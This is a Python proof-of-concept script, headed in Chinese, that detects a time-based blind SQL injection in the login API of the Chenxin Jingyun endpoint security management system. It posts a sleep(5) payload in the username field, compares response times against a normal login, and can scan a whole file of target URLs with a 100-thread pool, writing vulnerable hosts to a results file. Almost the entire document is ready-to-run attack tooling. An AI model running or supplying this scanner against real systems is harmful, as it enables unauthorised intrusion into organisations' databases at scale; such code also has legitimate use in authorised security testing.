# 辰信景云终端安全管理系统存在SQL注入漏洞

import requests, sys, re, argparse, time
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def banner():
    test = """
         ███████╗ ██████╗ ██╗          ████████╗██╗███╗   ███╗███████╗
        ██╔════╝██╔═══██╗██║          ╚══██╔══╝██║████╗ ████║██╔════╝
        ███████╗██║   ██║██║             ██║   ██║██╔████╔██║█████╗
        ╚════██║██║▄▄ ██║██║             ██║   ██║██║╚██╔╝██║██╔══╝
        ███████║╚██████╔╝███████╗███████╗██║   ██║██║ ╚═╝ ██║███████╗
        ╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝

                                                                  author:秋妤
                                                                  date:2024.09.03
                                                                  version:1.0
    """
    print(test)

def poc(target):
    api = '/api/user/login'
    payload1 = "username=admin%40qq.com&password=21232f297a57a5a743894a0e4a801fc3="
    payload2 = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin%40qq.com'and(select*from(select+sleep(5))a)='"
    headers = {
        'Accept': 'application/json,text/plain,*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip,deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '72',
    }
    res1 = requests.post(url=target + api, verify=False, headers=headers, data=payload1)
    res2 = requests.post(url=target + api, verify=False, headers=headers, data=payload2)
    time1 = res1.elapsed.total_seconds()
    time2 = res2.elapsed.total_seconds()
    # print(time,time1)
    if time2 - time1 >= 4:
        with open('辰信景云SQL注入_result.txt', 'a', encoding='utf-8') as f:
            f.write(f'[+]{target}存在SQL注入\n')
            print(f'[+]{target}存在SQL注入')
    else:
        print(f'[-]{target}不存在SQL注入')

def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description="这是一个辰信景云终端安全管理系统的login存在SQL注入漏洞的扫描脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()